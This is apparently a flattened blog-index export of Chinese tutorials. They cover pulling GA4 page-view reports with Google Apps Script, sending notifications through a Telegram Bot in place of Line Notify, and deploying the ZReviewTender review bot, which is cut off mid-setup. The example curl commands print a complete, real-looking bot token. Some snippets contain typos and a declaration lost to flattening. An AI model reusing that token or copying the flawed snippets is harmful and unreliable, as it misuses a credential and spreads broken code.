前往 https://script.google.com/home 建立新專案，命名專案名稱 點擊「服務」-&gt;「+」新增服務 選擇「Google Analytics Data API」 點擊「新增」貼上 Google Analytics Data API 查詢程式碼並組合：將前面步驟產生的報表查詢數據參數：{ \"dimensions\": [ { \"name\": \"pageTitle\" } ], \"metrics\": [ { \"name\": \"screenPageViews\" } ], \"dateRanges\": [ { \"startDate\": \"7daysAgo\", \"endDate\": \"yesterday\" } ], \"limit\": \"10\", \"metricAggregations\": [ \"TOTAL\" ]}轉換成程式：function execute() { Logger.log(JSON.stringify(fetchScreenPageViews(\"318495208\")));}// 拆成獨立方法，方便日後重複使用...// 預設 startDate=7daysAgo, endDate=yesterday// 其他用法：// e.g. fetchScreenPageViews(\"1111\". \"3daysAgo\", \"yesterday\")// e.g. fetchScreenPageViews(\"2222\". \"yesterday\", \"today\")function fetchScreenPageViews(propertyId, startDate = \"7daysAgo\", endDate = \"yesterday\") { const screenPageViewsMetric = AnalyticsData.newMetric(); screenPageViewsMetric.name = \"screenPageViews\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const pageTitleDimension = AnalyticsData.newDimension(); pageTitleDimension.name = \"pageTitle\"; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [pageTitleDimension]; request.metrics = [screenPageViewsMetric]; request.dateRanges = dateRange; request.limit = 10; request.metricAggregations = \"TOTAL\"; return AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId);}程式碼解析：// metric 指標，可以是多個，請分開宣告...const screenPageViewsMetric = AnalyticsData.newMetric();screenPageViewsMetric.name = \"screenPageViews\";// 例如另一個 active1DayUsers：const active1DayUsersMetric = AnalyticsData.newMetric();active1DayUsersMetric.name = \"active1DayUsers\";// 宣告日期範圍const dateRange = AnalyticsData.newDateRange();dateRange.startDate = startDate;dateRange.endDate = endDate;// dimension 維度，可以是多個，請分開宣告...const pageTitleDimension = AnalyticsData.newDimension();pageTitleDimension.name = \"pageTitle\";// 例如另一個 dimension：const firstUserSourceMediumDimension = AnalyticsData.newDimension();firstUserSourceMediumDimension.name = \"firstUserSourceMedium\";//// 產生 Request 物件const request = AnalyticsData.newRunReportRequest();request.metrics = [active1DayUsersMetric, active1DayUsersMetric]; // 多個就都帶入...request.dimensions = [pageTitleDimension, firstUserSourceMediumDimension]; // 多個就都帶入...request.dateRanges = dateRange;// 只需要前 10 筆資料 (Top 10)request.limit = 10;// 設定數據合併計算邏輯：Total (SUM)request.metricAggregations = \"TOTAL\";// 產生查詢結果return AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId).rows;第一次執行，會需要授權(日後若程式碼有新增需要的權限也會要重新認證一次)： 實際上就是授權 Google Apps Script 日後使用你的帳號身份執行這些程式，所以需要確保你選擇的帳號身份有對應的 GA 報表存取權限。 撰寫好程式碼後，點擊「偵錯」-&gt; 點擊「審查權限」 選擇要執行的身份帳戶，通常等於當前 Google Apps Script 帳戶 選擇「進階」展開 -&gt; 點擊「前往 XXX」這是我們自己寫給自己用的應用程式，不需經過 Google 驗證。 點擊「允許」允許之後再點「偵錯」或「執行」就能執行程式：這邊我們先使用 Logger.log(JSON.stringify()) 取得輸出結果：{ \"kind\": \"analyticsData#runReport\", \"dimensionHeaders\": [ { \"name\": \"pageTitle\" } ], \"rowCount\": 71, \"metadata\": { \"currencyCode\": \"TWD\", \"timeZone\": \"Asia/Taipei\" }, \"rows\": [ { \"dimensionValues\": [ { \"value\": \"ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"166\" } ] }, { \"metricValues\": [ { \"value\": \"109\" } ], \"dimensionValues\": [ { \"value\": \"Apple Watch 原廠不鏽鋼米蘭錶帶開箱 | ZhgChgLi\" } ] }, { \"dimensionValues\": [ { \"value\": \"iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居 | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"101\" } ] }, { \"dimensionValues\": [ { \"value\": \"Medium Partner Program 終於對全球(包含台灣)寫作者開放啦！ | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"85\" } ] }, { \"metricValues\": [ { \"value\": \"77\" } ], \"dimensionValues\": [ { \"value\": \"iOS 捷徑自動化應用場景 — 自動轉發簡訊與自動建立提醒待辦事項 | ZhgChgLi\" } ] }, { \"metricValues\": [ { \"value\": \"51\" } ], \"dimensionValues\": [ { \"value\": \"遊記 9/11 名古屋一日快閃自由行 | ZhgChgLi\" } ] }, { \"metricValues\": [ { \"value\": \"42\" } ], \"dimensionValues\": [ { \"value\": \"iOS 隱私與便利的前世今生 | ZhgChgLi\" } ] }, { \"dimensionValues\": [ { \"value\": \"iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework Session | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"34\" } ] }, { \"dimensionValues\": [ { \"value\": \"iOS ≥ 18 NSAttributedString attributes Range 合併的一個行為改變 | ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"30\" } ] }, { \"metricValues\": [ { \"value\": \"30\" } ], \"dimensionValues\": [ { \"value\": \"手工打造 HTML 解析器的那些事 | ZhgChgLi\" } ] } ], \"metricHeaders\": [ { \"type\": \"TYPE_INTEGER\", \"name\": \"screenPageViews\" } ], \"totals\": [ { \"dimensionValues\": [ { \"value\": \"RESERVED_TOTAL\" } ], \"metricValues\": [ { \"value\": \"1229\" } ] } ]} Google Apps Script 請求 GA 數據成功！🎉🎉🎉Step 3. 組合起來！Google Apps Script + GA4 + Telegram Bot依照上篇文章「 10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知 」建立你的 Telegram Bot 取得 Bot Token &amp; 想要傳送到的 Channel Chat ID 。const telegramToken = \"XXXX\" // 帶入你的 Telegram Bot Token//function execute() { const screenPageViewsReport = fetchScreenPageViews(\"318495208\"); // const total = parseInt(screenPageViewsReport.totals[0].metricValues[0].value); var message = \"總瀏覽數：\"+total.toLocaleString()+\"\\n\"; screenPageViewsReport.rows.forEach(function(element, index) { const pageTitle = element.dimensionValues[0].value; const value = parseInt(element.metricValues[0].value); message += \"[Top \"+(index + 1)+\"] \"+pageTitle+\": \"+value.toLocaleString()+\"\\n\"; }); sendNotifyMessage(message, -xxxx); // 帶入你的 Channel Chat ID}// 發送訊息到 Telegram 指定 Channel Chat IDfunction sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\"+telegramToken+\"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"disable_web_page_preview\": true } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); if (data[\"ok\"] == undefined || data[\"ok\"] != true) { if (data[\"error_code\"] != undefined &amp;&amp; data[\"error_code\"] == 429) { Utilities.sleep(1000); sendNotifyMessage(message, chatId); } }}function fetchScreenPageViews(propertyId, startDate = \"7daysAgo\", endDate = \"yesterday\") { const screenPageViewsMetric = AnalyticsData.newMetric(); screenPageViewsMetric.name = \"screenPageViews\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const pageTitleDimension = AnalyticsData.newDimension(); pageTitleDimension.name = \"pageTitle\"; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [pageTitleDimension]; request.metrics = [screenPageViewsMetric]; request.dateRanges = dateRange; request.limit = 10; request.metricAggregations = \"TOTAL\"; return AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId);}程式碼解析：//... // 依照報表回傳的 json 找到 total 位置，parseInt 將字串轉成 INT 數字格式 // .toLocaleString() -&gt; 格式化數字，123456 -&gt; 123,456 const total = parseInt(screenPageViewsReport.totals[0].metricValues[0].value); var message = \"總瀏覽數：\"+total.toLocaleString()+\"\\n\"; // 依照報表回傳的 json 遍歷資料，組合成訊息 screenPageViewsReport.rows.forEach(function(element, index) { const pageTitle = element.dimensionValues[0].value; const value = parseInt(element.metricValues[0].value); message += \"[Top \"+(index + 1)+\"] \"+pageTitle+\": \"+value.toLocaleString()+\"\\n\"; });//...執行：點擊上方「執行」或「偵錯」並確定方法名稱是選擇「 execute 」： 成功！🎉🎉🎉設定排程定時自動執行最後一步是我們希望報表機器人能定時自動執行，從左側選單前往「觸發條件」： 選擇右下角「新增觸發條件」按鈕 選擇鐔要執行的功能：選擇 「 execute 」方法名稱 選擇執行的部署作業：選擇「 上端 」 選取活動來源：選擇「 時間驅動 」 選取時間型觸發條件類型：選擇你想要的觸發頻率 選取時段：選擇你想要每日自動觸發的時間 如果執行失敗…通知信件的頻率設定 儲存 完成！這樣時間到就會自動執行囉。 🎉🎉🎉延伸作業其他數據如 新使用者數、來源媒介等，同樣使用前面程式碼就能達成，這邊就不在重複贅述，就當成給大家的回家作業囉。有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 303 Total Views Last Statistics Date: 2025-01-19 | 255 Views on Medium. " }, { "title": "10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知", "url": "/posts/6922e90ba90c/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, line, telegram, google-apps-script, automation", "date": "2024-10-12 21:10:46 +0800", "snippet": "10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知手把手將 Line Notify 個人通知服務遷移至同樣免費、更強大的 Telegram BotPhoto by Lana CodesLINE Notify結束服務公告 感謝您長期以來使用LINE Notify。 LINE Notify自2016年9月推出以來，一直致力於為開發者提供服務。為能提供更優質的服務，...", "content": "10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知手把手將 Line Notify 個人通知服務遷移至同樣免費、更強大的 Telegram BotPhoto by Lana CodesLINE Notify結束服務公告 感謝您長期以來使用LINE Notify。 LINE Notify自2016年9月推出以來，一直致力於為開發者提供服務。為能提供更優質的服務，並將經營資源集中於後續的類似商品服務，我們決定於2025年3月31日結束本服務。對於長期以來支持並使用LINE作為通知連動服務的所有用戶，我們深表感謝。 若您仍需使用LINE向用戶傳送通知的商品服務，建議可改用功能更豐富的Messaging API。擷取自 Line Notify 官網 ， Line 於 2024/10/08 發文公告 Line Notify 將於 2025/04/01 完全關閉，如需繼續使用 Line 做為訊息通知，只能用付費的 Message API 。Line Notify 的優點是非常容易串接，拿來做個人通知機器人非常方便好用，一些 Line Bot 或第三方服務也會使用 Line Notify 進行通知 (例如：路易莎、你訂的訂單通知功能)；但缺點也蠻多的，例如訊息內容單一、無法分群組(統一都是傳送到 Line Notify Bot)、訊息內容長度有限…等等隨著 Line Notify 宣告終止，正好也給我了一個遷移至其他通訊、通知服務的機會： Slack：免費版訊息只保留 30 天、我的通知比較是個人，用 Slack 有點大材小用。(Slack 傳送訊息可參考我之前的文章： Slack &amp; ChatGPT Integration ) Discord：我的通知比較是個人，一樣有點大材小用。 Telegram：免費、幾乎無限使用。對我來說 Telegram 的通訊服務比較符合我原本 Line Notify 的使用需求，我需要一個能接收通知的頻道，最好是能依照不同需求有不同的頻道，可接受的內容、格式越豐富越好、並且能快速簡單串接；Telegram 都符合上述需求，還能多實現跟 Bot 的交互功能。成果先上最終效果圖(以 Github Star 通知、Repo Stats 通知為例 )： ✅ 有人按 Repo 星星時會觸發 Webhook -&gt; Google Apps Script -&gt; Telegram Bot 發送通知到 Telegram — Github Stats Group ✅ Google Apps Script 每日定時 -&gt; 撈取 Github Repo Stats 狀態 -&gt; Telegram Bot 發送通知到 Telegram — Github Stats Group ✅ 使用 /update Telegram Bot Command 觸發撈取 Github Repo Stats 狀態 -&gt; Telegram Bot 發送通知到 Telegram — Github Stats Group對比原本 Line Notify ❌ 所有訊息無法分類、分群組都傳到 Line Notify ❌ 無法針對個別訊息做特殊設定 (如通知聲、靜音…) ❌ 無法輸入訊息互動本文目錄 設定 Telegram Bot 移轉 Line Notify 發送訊息到 Telegram Bot (Google Apps Script) 與 Telegram Bot 交互 (Command) x 使用 Google Apps Script(1/2) 設定 Telegram BotTelegram Bot 的申請非常簡單，連網頁都不需要開，只要跟官方的 BotFather 機器人 互動就可以了。Step 1. 申請 Telegram Bot安裝、註冊好 Telegram 服務 之後，點擊加「 BotFather 機器人 」為好友。 打開、加入 BotFather 機器人 加入後直接傳送訊息「 /newbot 」建立你的機器人。 輸入你的機器人名稱 輸入你的機器人帳號 (不可重複、必須以 bot 為結尾，例如我的 zhgchgli_bot ) 你的 Bot 連結，點進進入開始使用 (e.g. t.me/harrytest56_bot) 取得 你的_BOT_API_Token ， 請妥善保存 ⚠️⚠️⚠️點擊 4. 取得的 Bot 連結，開始使用 Bot：目前無任何功能，可以點右上角 Info，編輯名稱或上傳大頭貼。Step 2. 創建 Telegram 通知 Group &amp; 加入機器人帳號 我希望不同的個人通知類型傳到不同的 Group，這 邊因為 Demo 只創建一個 My Notify Group 。 你可以依據實際需求創建不同的 Group &amp; 依照步驟加入、設定機器人。 New Group 搜尋你的機器人帳號＆點擊加入 設定 Group 名稱、大頭貼Step 3. 取得 Group Chat IDTelegram Bot API 沒有直接取得 Group 列表、Group Chat ID 的 Endpoint，只能透過 /getUpdates 取得機器人訊息列表，並從中找到 Group Chat ID：Request:curl 'https://api.telegram.org/bot你的_BOT_API_Token/getUpdates' Telegram API 格式為 https://api.telegram.org/bot 你的_BOT_API_Token /getUpdates ， BOT API Token 字串前要加上 bot 字串 範例： curl 'https://api.telegram.org/bot7814194578:AAEWpPJvKn06ID7D9FjV65aDKQLkGkz8cc8/getUpdates'Response:{ \"ok\": true, \"result\": [ { \"update_id\": 706454235, \"my_chat_member\": { \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": false }, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"date\": 1728726861, \"old_chat_member\": { \"user\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"status\": \"left\" }, \"new_chat_member\": { \"user\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"status\": \"member\" } } }, { \"update_id\": 706454236, \"message\": { \"message_id\": 1, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728726861, \"group_chat_created\": true } }, { \"update_id\": 706454237, \"message\": { \"message_id\": 2, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728726864, \"new_chat_photo\": [ { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANhAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFQAAQ\", \"file_size\": 5922, \"width\": 160, \"height\": 160 }, { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANiAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFRn\", \"file_size\": 15097, \"width\": 320, \"height\": 320 }, { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANjAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFQB\", \"file_size\": 37988, \"width\": 640, \"height\": 640 } ] } } ]}可以從回應中找到對應 Group Name + type=group 的巢狀 JSON 資料，其中的 id 就是 Group Chat ID:\"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": false} Group Chat Id = -4532420331 ⚠️⚠️⚠️️ 如果你的 Response 為空 { \"ok\": true, \"result\": [] } 請嘗試在你的 Group 發送訊息 (e.g. Hello ) 再重新 Call API 應該就有了。Step 4. 發送訊息我們可以使用 /sendMessage 發送訊息到 Group。Request:curl 'https://api.telegram.org/bot你的_BOT_API_Token/sendMessage' \\--form 'chat_id=\"Group Chat Id\"' \\--form 'text=\"訊息內容\"'範例：curl 'https://api.telegram.org/bot7814194578:AAEWpPJvKn06ID7D9FjV65aDKQLkGkz8cc8/sendMessage' \\--form 'chat_id=\"-4532420331\"' \\--form 'text=\"test\"' API 參數可參考官方文件Response &amp; Result:{ \"ok\": true, \"result\": { \"message_id\": 5, \"from\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728727847, \"text\": \"test\" }} 發送成功取得以上 Response 回 Telegram Group 就會出現剛發送的訊息內容。(2/2) 移轉 Line Notify 發送訊息到 Telegram Bot (Google Apps Script)我的個人通知機器人服務是使用 Google Apps Script 達成的，因此以 Google Apps Script 轉換為例 (類 JavaScript)。原始的 Line Notify 發送程式碼：const lineToken = \"XXXX\";function sendLineNotifyMessage(message) { var url = 'https://notify-api.line.me/api/notify'; var options = { method: 'post', headers: { 'Authorization': 'Bearer '+lineToken }, payload: { 'message': message } }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());}可以看到非常簡單方便好用…移轉成 Telegram Bot 發送程式碼：const telegramToken = \"你的_BOT_API_Token\";const TelegramChatId = { GA: -123456, GITHUB: -123457, MEDIUM: -123458};function sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\"+telegramToken+\"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"parse_mode\": \"Markdown\" } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());}照前面 Telegram Bot 設定步驟取得的資訊。 telegramToken = 你的_BOT_API_Token TelegramChatId 這邊是我自己多定義的方法，因為實務上我希望不同的通知分別傳送到不同的 Group，因此定義了一個結構管理目標 Group 與他的 Group Chat Id 。/sendMessage API 參數，更多參數、細節可參考官方文件 ，以下是我自己會用到的參數： text: 訊息內容 (必帶) chat_id: 目標 Group Chat Id (必帶) parse_mode: 訊息內容解析方式，這邊我指定 Markdown disable_web_page_preview: 訊息內容的連結是否不要預覽，這邊設 true 關閉，可以讓訊息顯示更簡潔。使用方式：sendNotifyMessage(\"Hello\", TelegramChatId.MEDIUM) // 發送 Hello 訊息到 MEDIUM Group Chat IdsendNotifyMessage(\"Hello\", -1234) // 發送 Hello 訊息到 -1234 Group Chat Id成果以我的 Github Repo Star Notifier 機器人 為例： 驗證成功！ 當有人按我的 Repo Star 時能正確改發送通知到 Telegram Group！🎉🎉🎉 製作方式可參考我之前的文章「 使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier 」設定特殊聲音或靜音比 Line Notify 更棒的事是我們還可以對不同的 Group 設定不同的通知聲音或是靜音。與 Telegram Bot 交互 (Command) x 使用 Google Apps Script除了替代 Notify 功能之外， Telegram Bot 還能輕易地實現與使用者交互的功能 — Telegram Bot Command。回到我的使用場景，我的機器人會定時或是 Webhook 觸發傳送通知訊息送給我；但有時候我也想手動觸發機器人立刻取得當前結果，以往 Line Notify 沒有這個功能，以 Google Apps Script 來說就只能暴力的設定一個網址，只要打開網址就會觸發，很不好用。Telegram Bot Command 就能讓我直接輸入指令訊息，命令機器人立刻執行我想做的事情。 本文以 Goolge Apps Script 為例，Google Apps Script 詳細介紹可參考我之前文章「 使用 Google Apps Script 實現 Google 服務 RPA 自動化 」。Step 1. 使用 Google Apps Script 實現 Command 處理邏輯 前往 Google Apps Script 首頁 左上方「建立新專案」 點擊「未命名專案」輸入專案名稱 e.g. Telegram 貼上基礎程式碼：const telegramToken = \"你的_BOT_API_Token\";function doPost(e) { const content = JSON.parse(e.postData.contents); if (content.message &amp;&amp; content.message.text) { const command = content.message.text.split(' ')[0]; const chatId = content.message.chat.id; if (command.startsWith(\"/update\")) { // 收到 /update 指令 // 在這邊處理你想做的事...然後回應... sendNotifyMessage(\"你好.....\\n指令:\"+command, chatId); } } return HtmlService.createHtmlOutput(\"OK!\");}function sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\"+telegramToken+\"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"disable_web_page_preview\": true, \"parse_mode\": \"Markdown\" } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());} telegramToken = 你的_BOT_API_Token 上述 Demo 程式我們在收到 Post 請求、Command 參數等於 /update 時回應 你好… 模擬收到指令後處理後回應的場景。Step 2. 完成 Google Apps Script Web 部署 右上角「部署」-&gt; 「新增部署作業」 左上角「設定」-&gt;「網頁應用程式」 誰可以存取選擇「所有人」 新增部署作業，選擇「授予存取權」 跳出帳號視窗，選擇你的 Google 登入帳號 跳出警告視窗，選擇「Advanced」-&gt;「Go to 專案名稱 (unsafe)」 選擇「Allow」 網頁應用程式網址： 你的 Webhook 網址 。 複製下來。e.g. https://script.google.com/macros/s/AKfycbx2oFv-eB4LezdOk3P3aoEZVhx_PI6n_YnTNP7WVVQSaiRU52di5bKNThsvIZxus3Si/exec Google Apps Script 網頁應用程式部署、更新、使用、除錯可參考我之前的文章「 使用 Google Apps Script 實現 Google 服務 RPA 自動化 」。 ⚠️⚠️⚠️ 請注意，如果 Google Apps Script 程式碼有變更要點擊部署-&gt;管理部署-&gt;選擇建立新版本才會生效，細節可參考上述文章。 ⚠️⚠️⚠️請注意，如果 Google Apps Script 程式碼有變更要點擊部署-&gt;管理部署-&gt;選擇建立新版本才會生效，細節可參考上述文章。 ⚠️⚠️⚠️請注意，如果 Google Apps Script 程式碼有變更要點擊部署-&gt;管理部署-&gt;選擇建立新版本才會生效，細節可參考上述文章。Step 3. 註冊 Webhook使用 Telegram API /setWebhook 註冊你的 Webhook 網址。Request:curl --location 'https://api.telegram.org/你的_BOT_API_Token/setWebhook' \\--form 'url=\"你的 Webhook 網址\"'Response:{ \"ok\": true, \"result\": true, \"description\": \"Webhook was set\"}測試 我們會根據不同的 Chat Id 回應，因此不管是 1:1 對機器人或是有機器人在的 Group 群組都能回應。 成功 🎉🎉🎉下篇： 簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人其他 Google Apps Script 自動化文章 使用 Google Apps Script 實現 Google 服務 RPA 自動化 Slack &amp; ChatGPT Integration 使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier附註本文也是我 Medium 的第 100 篇文章(2018/10 發表 第一篇 ，6 年了)，堅持不懈、繼續努力，詳細心得跟數據等到破 1000 Followers (2024/10 目前 925) 或是總瀏覽數破 1,000,000 (2024/10 目前 984,549) 時再來分享。有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 4,836 Total Views Last Statistics Date: 2025-01-19 | 3,818 Views on Medium. " }, { "title": "Quick Start! Github Action x ZReviewTender 免費快速部署你的 App 商城評價監控機器人", "url": "/posts/0095528cf875/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, app-review, app-store, google-play, android", "date": "2024-09-26 20:42:21 +0800", "snippet": "[Quick Start! ] Github Action x ZReviewTender 免費快速部署你的 App 商城評價監控機器人簡單三步驟為您建立免費穩定安全的 App 評價機器人，即時關注使用者的最新評價。ZReviewTender [English Version] : [Quick Start! ] Github Action x ZReviewTender Free and...", "content": "[Quick Start! ] Github Action x ZReviewTender 免費快速部署你的 App 商城評價監控機器人簡單三步驟為您建立免費穩定安全的 App 評價機器人，即時關注使用者的最新評價。ZReviewTender [English Version] : [Quick Start! ] Github Action x ZReviewTender Free and Fast Deployment of Your App Store Review Monitoring BotZReviewTenderZReviewTender — 是我在 2022/08 製作開源的 App 商城評價機器人，功能是會自動撈取 iOS App Store, Android Google Play 商城上的 App 使用者評價並轉發到指定的 Slack Channel。另外可以指定評價撈取規則、串接 Google 翻譯、Asana、Google Sheet，也支援自訂義客製化操作。Github ActionGithub Action 是由 Github 提供的 CI/CD 自動化集成工具，我們可以使用自己的機器做為伺服器 (Github Runner)亦或是直接使用 Github 提供的機器執行 CI/CD、自動化腳本。費用及限制 使用自己的機器 (Github Runner):無特別費用，只有最高執行數、並行上限、部分 API 短期最大請求數量限制。 使用 Github 提供的機器:GitHub Free 提供基本 500 MB Storage (for CI/CD Artifact)、2,000 Minutes 一個月執行分鐘數。這邊要注意的是因為機器成本問題： 如果使用 Github 的 Windows 機器，消耗的分鐘數等於實際分鐘數 x 2 如果使用 Github 的 macOS 機器，消耗的分鐘數等於實際分鐘數 x 10詳細計價計算請參考 官方價格計算器 。 ZReviewTender Minutes per month 消耗：約 120 分鐘 只需要跑在基礎計價的 Linux 上，每次執行約消耗 ≤ 1 分鐘，預設每 6 小時執行一次，一天花費 4 分鐘，一個月約消耗 120 分鐘，免費額度就很足夠了。 ZReviewTender Storage 消耗：0 無使用 Artifact 儲存資料，因此沒有 Storage 的開銷。Slack公司使用的內部通訊軟體，會建立一個 Slack App 並透過這個 Slack App 身份轉發 App 商城評價通知到指定的頻道。ZReviewTender x Github Action x Slack 我們使用 Github Action 來執行 ZReviewTender 腳本轉發結果到 Slack，Github Repo(Action) 只是當載體使用，因此就算您的主專案不使用 Github 託管，依然可以簡單照以下步驟完成 ZReviewTender 部署。🎉🎉🎉 我已經成功部署在 5 個不同公司的不同 Apps 並穩定、免費執行了至少 2 年以上。優點： 免費 ： ZReviewTender 是我製作的開源免費服務、部署在 Github Action 使用免費額度綽綽有餘。 您不需要在每個月花錢買 App Review Bot 之類的月費評價機器人服務。 安全 ：撈取評價用的憑證、金鑰均安全存放在你的 Github Private Repo，除了你之外沒有人有權限存取。您不需要再冒著洩漏風險把重要的憑證、金鑰上傳給第三方服務使用； ZReviewTender 為開源專案，一切操作經的起大眾檢視。 可靠 ： ZReviewTender 使用官方最新提供的 API 撈取評價資訊，相較以往其他服務使用 RSS 撈取評價，更準確、穩定可靠。Buy me coffee ❤️❤️❤️https://www.buymeacoffee.com/zhgchgli 如果這個專案有幫助到您，歡迎贊助我一杯咖啡，謝謝。Quick Start!🚀 整個設定步驟約需 30 分鐘，但只需設定一次，除非憑證金鑰有更換，不然可以永久免費穩定的運作。 🚀🚀🚀🚀🚀Step 1. 建立 Slack App如果您的組織內已有建立過有 chat:write 之類的發訊息權限 Slack App，可以直接復用，不用建立新的。前往 Slack Apps 首頁：https://api.slack.com/apps點擊右上角「Create New App」。 選擇：From scratch 輸入 App Name： ZReviewTender 或自定義 Slack App 名稱 選擇目標安裝的 Slack Workspace：請確認你選擇的 Workspace，你有新增 Slack App 的權限。 Create App新增 OAuth &amp; Permissions Scopes： Slack app 建立完成後，先到「OAuth &amp; Permissions」頁籤設定 Scopes。 選擇「OAuth &amp; Permissions」 下滑找到 Scopes Section 依序輸入新增 ZReviewTender Slack App 必備的三個 Scopes：chat:writechat:write.publiclinks:writeInstall App 回到 Install App 頁籤安裝 Slack App 到 Workspace。 選擇「Install App」 點擊「Install to YOUR_WORKSPACE 」 點擊「Allow」安裝完成後回到 Install App 頁面就會出現 Slack App Bot User OAuth Token ，點擊「Copy」複製， 記下來，稍後設定使用 。建立預收到評價通知的頻道： Sidebar -&gt; Channels -&gt; Create -&gt; Create channel Name: 輸入想要的頻道名稱Visibility： Public：對所有人公開，無需其他動作。 Private：私密頻道， ⭐️⭐️⭐️ 需要把剛剛建立的 Slack App 加入：Slack App 加入頻道方式： 點擊上方 #頻道名稱 點擊「Settings」 點擊「Add an App」 搜尋你剛建立的 Slack App 名稱 點擊「Add」加入成功頻道會有提示字詞。 ZReviewTender joined. ⭐️⭐️⭐️這邊有發現一個 Slack Bug，Slack App 剛建立完可能會搜尋不到，要等一陣子才會出現；可以先使用 Public Channel，Public Channel 不需要將 Slack App 加入就能使用。取得 Channel ID: 最後一步，最重要的我們要取得 Channel ID 稍後設定要使用。 點擊上方 #頻道名稱 About 最下方有一個 Channed ID 資訊 記下 Channel ID ，稍後設定使用 Slack 步驟完成。— — —其他補充：你可以在「Basic Information」-&gt;「Display Information」編輯 Slack App 名稱、icon：修改完成後記得點右下角「Save Changes」才會儲存。如果 OAuth &amp; Permissions Scopes 有新增需要點擊「reinstall your app」重新安裝才會生效：Step 2. 產生 Apple App Store Connect API &amp; Google Play Android Developer API 身份憑證Apple App Store Connect API 身份憑證iOS 比較容易，我們只需要從 App Store Connect 得到以下四個資訊即可：Issuer ID： App Store Connect -&gt; Keys -&gt; App Store Connect API 記下 Issuer ID ，稍後設定使用Private Key ID &amp; Private Key：點擊「+」新增按鈕： Name: ZReviewTender Access: App Manager Key ID ，稍後設定使用 點擊「Download API Key」保存下載下來的「 AuthKey_XXXXXXXXXX.p8 」檔案，稍後設定使用。App ID : (要撈取評價的目標 App ID)App ID 可以在 App Store Connect -&gt; App Store -&gt; General -&gt; App Information -&gt; App ID 找到。 記下 App ID ，稍後設定使用Google Play Android Developer API 身份憑證Android 較為複雜，需要先從 App 專案所屬的 Google Cloud Project 啟用 API &amp; 建立 Service Account (服務帳戶) &amp; 將服務帳戶加入 Google Play Console 並賦予 App 權限。前往 Google Cloud Project：選擇 App 專案所屬的 Google Cloud Project 或建立一個新 Project。啟用「Android Developer API」： 搜尋「Android Developer API」點擊進入 選擇「啟用」[此步驟可選] 您也可以同時啟用「Cloud 